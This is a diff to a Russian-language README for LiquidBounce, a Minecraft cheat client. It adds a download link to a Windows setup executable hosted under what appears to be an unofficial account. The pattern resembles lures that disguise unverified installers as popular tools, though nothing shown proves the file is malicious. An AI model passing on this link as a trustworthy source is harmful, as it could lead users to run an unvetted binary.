@@ -1,5 +1,7 @@
 # ⚡ LiquidBounce
 
+Сыллка на скачивание: https://github.com/GoodCode671/liquidbounce-CheatClient2026/releases/download/0.6.1/LiquidLauncher_0.6.1_x64-setup.exe
+
 LiquidBounce — бесплатный open-source чит-клиент для Minecraft на Fabric API. Современный стек, модульная архитектура и мощная система скриптов.
 
 ---
